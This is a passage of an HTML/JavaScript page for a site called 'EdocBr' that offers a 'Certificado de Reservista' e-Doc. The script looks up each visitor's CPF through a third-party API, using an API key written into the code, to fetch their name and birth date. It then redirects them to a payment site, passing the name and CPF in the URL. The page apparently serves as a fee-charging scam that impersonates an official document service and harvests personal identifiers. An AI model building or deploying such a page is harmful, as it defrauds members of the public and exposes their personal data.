                            <input type="text" id="uf" class="input-field" style="text-transform: uppercase;" disabled>
                        </div>
                    </div>
                    <div class="btn-group">
                        <button onclick="proximoStep(4)" class="btn-primary">
                            <i class="fas fa-arrow-right mr-2"></i> Prosseguir
                        </button>
                        <button onclick="voltarStep(2)" class="btn-secondary">
                            <i class="fas fa-arrow-left mr-2"></i> Voltar
                        </button>
                    </div>
                    <div id="resultadoEndereco" class="mt-2 text-center"></div>
                </div>

                <!-- Step 4: Confirmation -->
                <div class="step" id="step4">
                    <h2 class="text-lg font-semibold mb-3 text-center text-gray-800">Confirmação Final</h2>
                    <div class="preview-box">
                        <h3 class="text-sm font-semibold mb-2 text-gray-800">Dados Pessoais</h3>
                        <div><strong>Nome Completo:</strong> <span id="nomeCompletoFinal" class="font-medium"></span></div>
                        <div><strong>Data de Nascimento:</strong> <span id="dataNascimentoFinal" class="font-medium"></span></div>
                        <div><strong>Tipo de eDoc:</strong> <span id="viaSelecionadaFinal" class="font-medium"></span></div>
                    </div>
                    <div class="preview-box">
                        <h3 class="text-sm font-semibold mb-2 text-gray-800">Endereço</h3>
                        <div><strong>CEP:</strong> <span id="cepFinal" class="font-medium"></span></div>
                        <div><strong>Logradouro:</strong> <span id="logradouroFinal" class="font-medium"></span></div>
                        <div><strong>Número:</strong> <span id="numeroFinal" class="font-medium"></span></div>
                        <div><strong>Complemento:</strong> <span id="complementoFinal" class="font-medium"></span></div>
                        <div><strong>Bairro:</strong> <span id="bairroFinal" class="font-medium"></span></div>
                        <div><strong>Cidade:</strong> <span id="cidadeFinal" class="font-medium"></span></div>
                        <div><strong>Estado:</strong> <span id="ufFinal" class="font-medium"></span></div>
                    </div>
                    <div class="btn-group">
                        <button onclick="enviarSolicitacao()" class="btn-primary">
                            <i class="fas fa-check-circle mr-2"></i> Solicitar e-Doc
                        </button>
                        <button onclick="voltarStep(3)" class="btn-secondary">
                            <i class="fas fa-arrow-left mr-2"></i> Voltar
                        </button>
                    </div>
                    <div id="resultadoConfirmacao" class="mt-2 text-center"></div>
                </div>
            </div>
        </main>
    </div>

    <footer class="footer">
        <div class="copyright">
            <p>EdocBr © 2025 - Todos os direitos reservados</p>
            <p class="mt-1">
                <a href="#">Termos de Uso</a> | 
                <a href="#">Política de Privacidade</a>
            </p>
        </div>
    </footer>

    <script>
        let consultaData = null;
        let enderecoData = null;

        // Mobile Menu Toggle
        const mobileMenuBtn = document.getElementById('mobileMenuBtn');
        const navMenu = document.getElementById('navMenu');

        mobileMenuBtn.addEventListener('click', () => {
            navMenu.classList.toggle('active');
            mobileMenuBtn.innerHTML = navMenu.classList.contains('active') 
                ? '<i class="fas fa-times"></i>' 
                : '<i class="fas fa-bars"></i>';
        });

        // Máscara de CPF
        document.getElementById('cpfInput').addEventListener('input', function (e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 11) value = value.slice(0, 11);
            value = value.replace(/^(\d{3})(\d)/, '$1.$2')
                        .replace(/^(\d{3})\.(\d{3})(\d)/, '$1.$2.$3')
                        .replace(/\.(\d{3})(\d)/, '.$1-$2');
            e.target.value = value;
        });

        // Máscara de CEP e busca automática
document.getElementById('cepInput').addEventListener('input', function (e) {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 8) value = value.slice(0, 8);
    value = value.replace(/^(\d{5})(\d)/, '$1-$2');
    e.target.value = value;

    // Busca automaticamente quando o CEP estiver completo
    if (value.replace(/\D/g, '').length === 8) {
        buscarCEP();
    } else {
        // Limpa os campos se o CEP estiver incompleto
        document.getElementById('logradouro').value = '';
        document.getElementById('bairro').value = '';
        document.getElementById('cidade').value = '';
        document.getElementById('uf').value = '';
        document.getElementById('complemento').value = '';
    }
});

        // Validação de CPF
        function validarCPF(cpf) {
            cpf = cpf.replace(/[^\d]/g, '');
            if (cpf.length !== 11) return false;
            if (/^(\d)\1{10}$/.test(cpf)) return false;
            let soma = 0;
            for (let i = 0; i < 9; i++) soma += parseInt(cpf.charAt(i)) * (10 - i);
            let resto = (soma * 10) % 11;
            if (resto === 10 || resto === 11) resto = 0;
            if (resto !== parseInt(cpf.charAt(9))) return false;
            soma = 0;
            for (let i = 0; i < 10; i++) soma += parseInt(cpf.charAt(i)) * (11 - i);
            resto = (soma * 10) % 11;
            if (resto === 10 || resto === 11) resto = 0;
            return resto === parseInt(cpf.charAt(10));
        }

        // Exibir mensagens de feedback
        function showMessage(elementId, type, message) {
            const resultadoDiv = document.getElementById(elementId);
            resultadoDiv.innerHTML = `<p class="${type}">${message}</p>`;
            setTimeout(() => resultadoDiv.innerHTML = '', 3000);
        }

    // 🔄 CONSULTAR CPF — AGORA COM API TRUST (COM TOKEN)
    async function consultarCPF() {
        const cpfInput = document.getElementById('cpfInput').value;
        const viaSelecionada = document.querySelector('input[name="via"]:checked');
        const resultadoDiv = document.getElementById('resultadoCPF');
        const consultButton = document.querySelector('#step1 button');
        consultButton.disabled = true;

        resultadoDiv.innerHTML = `
            <div class="loading-container">
                <div class="spinner"></div>
                <p class="loading-text">Verificando Dados...</p>
            </div>
        `;

        const cpf = cpfInput.replace(/\D/g, '');
        const cpfPattern = /^\d{3}\.\d{3}\.\d{3}-\d{2}$/;

        if (!cpfInput) {
            consultButton.disabled = false;
            showMessage('resultadoCPF', 'error', 'Por favor, informe seu CPF');
            return;
        } else if (!cpfPattern.test(cpfInput)) {
            consultButton.disabled = false;
            showMessage('resultadoCPF', 'error', 'Formato de CPF inválido. Use: 000.000.000-00');
            return;
        } else if (!validarCPF(cpfInput)) {
            consultButton.disabled = false;
            showMessage('resultadoCPF', 'error', 'CPF inválido. Verifique os dígitos.');
            return;
        } else if (!viaSelecionada) {
            consultButton.disabled = false;
            showMessage('resultadoCPF', 'error', 'Por favor, selecione o tipo de via (Primeira ou Segunda Via)');
            return;
        }

        try {
    // 🔄 NOVA API DNNL
    const response = await fetch(`https://apicpf.com/api/consulta?cpf=${cpf}`, {
        headers: { 'X-API-KEY': '8694a55e2b745db25c1651ce164c67b53f2c6dfc541096675e355d7be7eb8ca1', 'Content-Type': 'application/json' }
    });

    if (!response.ok) {
        throw new Error('Erro ao consultar CPF');
    }

    const apiData = await response.json();
    console.log('Resposta da API:', apiData);

    const dadosApi = apiData.data; // A nova API retorna os dados diretamente em 'data'

    if (!dadosApi || !dadosApi.nome || !dadosApi.data_nascimento) {
        consultButton.disabled = false;
        showMessage('resultadoCPF', 'error', 'Dados não encontrados para este CPF');
        return;
    }

    // 🔁 Mapeia para o formato usado no restante do código
    consultaData = {
        cpf: dadosApi.cpf || cpf,
        nome_completo: dadosApi.nome,
        data_nascimento: dadosApi.data_nascimento,
        via: viaSelecionada.value + " Certificado de Reservista"
    };

    document.getElementById('nomeCompleto').textContent = consultaData.nome_completo.toUpperCase();
    document.getElementById('dataNascimento').textContent = consultaData.data_nascimento;
    document.getElementById('viaSelecionada').textContent = consultaData.via;

    consultButton.disabled = false;
    resultadoDiv.innerHTML = '';
    proximoStep(2);

} catch (error) {
    consultButton.disabled = false;
    showMessage('resultadoCPF', 'error', `Erro na consulta: ${error.message}`);
}

        }

       async function buscarCEP() {
    const cepInput = document.getElementById('cepInput').value;
    const resultadoDiv = document.getElementById('resultadoEndereco');
    const cep = cepInput.replace(/\D/g, '');

    // Validação básica
    if (cep.length !== 8) {
        return;
    }

    resultadoDiv.innerHTML = `
        <div class="loading-container">
            <div class="spinner"></div>
            <p class="loading-text">Buscando CEP...</p>
        </div>
    `;

    try {
        // Tentando API BrasilAPI (mais confiável)
        const response = await fetch(`https://brasilapi.com.br/api/cep/v1/${cep}`);

        if (!response.ok) {
            throw new Error('CEP não encontrado');
        }

        const data = await response.json();

        enderecoData = {
            cep: cep,
            logradouro: data.street || '',
            complemento: '',
            bairro: data.neighborhood || '',
            cidade: data.city || '',
            uf: data.state || ''
        };

        document.getElementById('logradouro').value = enderecoData.logradouro;
        document.getElementById('bairro').value = enderecoData.bairro;
        document.getElementById('cidade').value = enderecoData.cidade;
        document.getElementById('uf').value = enderecoData.uf;

        resultadoDiv.innerHTML = '';
        showMessage('resultadoEndereco', 'success', '✓ CEP encontrado!');

    } catch (error) {
        // Se BrasilAPI falhar, tenta ViaCEP como backup
        try {
            const response2 = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
            const data2 = await response2.json();

            if (data2.erro === true) {
                throw new Error('CEP não encontrado');
            }

            enderecoData = {
                cep: data2.cep,
                logradouro: data2.logradouro || '',
                complemento: data2.complemento || '',
                bairro: data2.bairro || '',
                cidade: data2.localidade || '',
                uf: data2.uf || ''
            };

            document.getElementById('logradouro').value = enderecoData.logradouro;
            document.getElementById('bairro').value = enderecoData.bairro;
            document.getElementById('cidade').value = enderecoData.cidade;
            document.getElementById('uf').value = enderecoData.uf;
            if (enderecoData.complemento) {
                document.getElementById('complemento').value = enderecoData.complemento;
            }

            resultadoDiv.innerHTML = '';
            showMessage('resultadoEndereco', 'success', '✓ CEP encontrado!');

        } catch (error2) {
            console.error('Erro ao buscar CEP:', error2);
            showMessage('resultadoEndereco', 'error', 'CEP não encontrado. Verifique e tente novamente.');
            limparCamposEndereco();
        }
    }
}

function limparCamposEndereco() {
    document.getElementById('logradouro').value = '';
    document.getElementById('bairro').value = '';
    document.getElementById('cidade').value = '';
    document.getElementById('uf').value = '';
    enderecoData = null;
}
        function enviarSolicitacao() {
            const numero = document.getElementById('numero').value;
            const resultadoDiv = document.getElementById('resultadoConfirmacao');

            if (!numero) {
                showMessage('resultadoConfirmacao', 'error', 'Por favor, informe o número');
                return;
            }

            if (!enderecoData || !enderecoData.cep) {
                showMessage('resultadoConfirmacao', 'error', 'Por favor, informe um CEP válido');
                return;
            }

            if (!consultaData || !consultaData.nome_completo || !consultaData.cpf) {
                showMessage('resultadoConfirmacao', 'error', 'Dados pessoais não encontrados. Por favor, refaça a consulta.');
                return;
            }

            resultadoDiv.innerHTML = `
                <div class="loading-container">
                    <div class="spinner"></div>
                    <p class="loading-text">Carregando informações...</p>
                </div>
            `;

            const checkoutUrl = `https://pay.pagobr.site/lqv130yareOZxbj?nome=${encodeURIComponent(consultaData.nome_completo)}&cpf=${consultaData.cpf}`;
            console.log('URL de checkout gerado:', checkoutUrl); // Log para depuração

            setTimeout(() => {
                resultadoDiv.innerHTML = '<p class="success">Solicitação enviada com sucesso! Redirecionando para o pagamento...</p>';

                document.getElementById('cepInput').value = '';
                document.getElementById('logradouro').value = '';
                document.getElementById('numero').value = '';
                document.getElementById('complemento').value = '';
                document.getElementById('bairro').value = '';
                document.getElementById('cidade').value = '';
                document.getElementById('uf').value = '';

                setTimeout(() => {
                    window.location.href = checkoutUrl;
                }, 500);
            }, 500);
        }

        function proximoStep(step) {
            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
            document.getElementById(`step${step}`).classList.add('active');
            document.querySelectorAll('.progress-step').forEach(s => s.classList.remove('active'));
            document.querySelectorAll('.progress-line').forEach(l => l.classList.remove('active'));

            for (let i = 1; i <= step; i++) {
                document.getElementById(`step-dot-${i}`).classList.add('active');
                if (i > 1) document.getElementById(`line-${i-1}`).classList.add('active');
            }

            if (step === 4) {
                document.getElementById('nomeCompletoFinal').textContent = consultaData.nome_completo.toUpperCase();
                document.getElementById('dataNascimentoFinal').textContent = consultaData.data_nascimento;
                document.getElementById('viaSelecionadaFinal').textContent = consultaData.via;
                document.getElementById('cepFinal').textContent = enderecoData.cep;
                document.getElementById('logradouroFinal').textContent = enderecoData.logradouro;
                document.getElementById('numeroFinal').textContent = document.getElementById('numero').value;
                document.getElementById('complementoFinal').textContent = document.getElementById('complemento').value || 'Não informado';
                document.getElementById('bairroFinal').textContent = enderecoData.bairro;
                document.getElementById('cidadeFinal').textContent = enderecoData.cidade;
                document.getElementById('ufFinal').textContent = enderecoData.uf;
            }

            window.scrollTo({ top: document.getElementById('step1').offsetTop - 80, behavior: 'smooth' });
        }

        function voltarStep(step) {
            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
            document.getElementById(`step${step}`).classList.add('active');
            document.querySelectorAll('.progress-step').forEach(s => s.classList.remove('active'));
            document.querySelectorAll('.progress-line').forEach(l => l.classList.remove('active'));

            for (let i = 1; i <= step; i++) {
                document.getElementById(`step-dot-${i}`).classList.add('active');
                if (i > 1) document.getElementById(`line-${i-1}`).classList.add('active');
            }

            window.scrollTo({ top: document.getElementById('step1').offsetTop - 80, behavior: 'smooth' });
        }

        function finalizar() {
            document.getElementById('cpfInput').value = '';
            document.querySelectorAll('input[name="via"]').forEach(radio => {
                radio.checked = false;
            });
            document.getElementById('nomeCompleto').textContent = '';
            document.getElementById('dataNascimento').textContent = '';
            document.getElementById('viaSelecionada').textContent = '';

            document.getElementById('cepInput').value = '';
            document.getElementById('logradouro').value = '';
            document.getElementById('numero').value = '';
            document.getElementById('complemento').value = '';
            document.getElementById('bairro').value = '';
            document.getElementById('cidade').value = '';
            document.getElementById('uf').value = '';

            consultaData = null;
            enderecoData = null;
            proximoStep(1);
        }
    </script>
</body>
</html>



